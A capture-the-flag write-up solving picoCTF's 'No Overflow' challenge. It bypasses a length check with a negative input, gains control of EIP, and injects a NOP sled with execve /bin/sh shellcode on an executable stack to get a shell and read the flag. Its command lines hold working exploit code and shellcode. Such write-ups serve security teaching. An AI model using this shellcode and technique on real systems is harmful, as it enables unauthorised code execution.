### Solved by barrebas

No Overflow is a 140 point challenge. 

This program tries to prevent buffer overflows by first asking for the input length. 

```bash
bas@tritonal:~/tmp/picoctf$ ./no_overflow 
How long is your name?
10
What is your name?
BBBBBBBBBBBBBBBBBBBBBBBBBB
Hello, BBBBBBBBBBW
```

It disregards the rest of the ouput. However, the program uses `scanf`. If we supply `-1` as the length, we can bypass the overflow check:

```bash
bas@tritonal:~/tmp/picoctf$ (echo -1; python -c 'print "A"*300') | ./no_overflow 
How long is your name?
What is your name?
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...snip...
Segmentation fault
```

From here, it is easy to control EIP:

```bash
bas@tritonal:~/tmp/picoctf$ (echo -1; python -c 'print "A"*268+"BBBB"'; echo) | ./no_overflow
How long is your name?
What is your name?
Hello, AAAAAAAAAA...snip...
Segmentation fault (core dumped)
bas@tritonal:~/tmp/picoctf$ gdb no_overflow core
...snip...
Core was generated by `./no_overflow'.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
```

Quickly checking on the remote server if there is any protection on the binary:

```bash
pico1139@shell:/home/no_overflow$ readelf -l no_overflow 

Elf file type is EXEC (Executable file)
Entry point 0x8048430
There are 9 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x0080c 0x0080c R E 0x1000
  LOAD           0x000f08 0x08049f08 0x08049f08 0x0012c 0x00130 RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x0006e0 0x080486e0 0x080486e0 0x0003c 0x0003c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1
```

The stack is executable! Furthermore, ASLR is not enabled. This makes it easy to stick in a [shellcode](http://shell-storm.org/shellcode/files/shellcode-827.php) plus a NOP sled and return to an address on the stack:

```bash
pico1139@shell:/home/no_overflow$ (echo -1; python -c 'print "A"*268+"\xd0\xd6\xff\xff"+"\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; cat) | ./no_overflow
How long is your name?
What is your name?
Hello, AAAAAAAAAAAAAAAAAAAAAA...snip...

id
uid=11066(pico1139) gid=1007(no_overflow) groups=1017(picogroup)
cat flag.txt
what_is_your_sign
```
